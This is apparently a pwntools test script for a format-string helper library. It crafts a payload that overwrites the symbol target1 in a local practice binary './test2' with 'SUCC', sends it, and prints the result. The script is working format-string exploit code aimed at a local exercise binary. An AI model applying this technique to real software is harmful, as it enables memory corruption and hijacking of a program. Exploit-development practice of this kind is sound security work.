from one_fmt import *
from pwn import *

elf = ELF("./test2", checksec=False)

fmt = Fmt(6)
fmt[elf.symbols["target1"]] = "SUCC\x00\x00\x00\x00"

# LEVEL 0
payload = fmt.build(0, True)
print hexdump(payload)
r = process("./test2", level="error")

r.send(payload)
r.recvuntil("----------\n\n")
print r.recvuntil("EDITME2\n")
r.close()
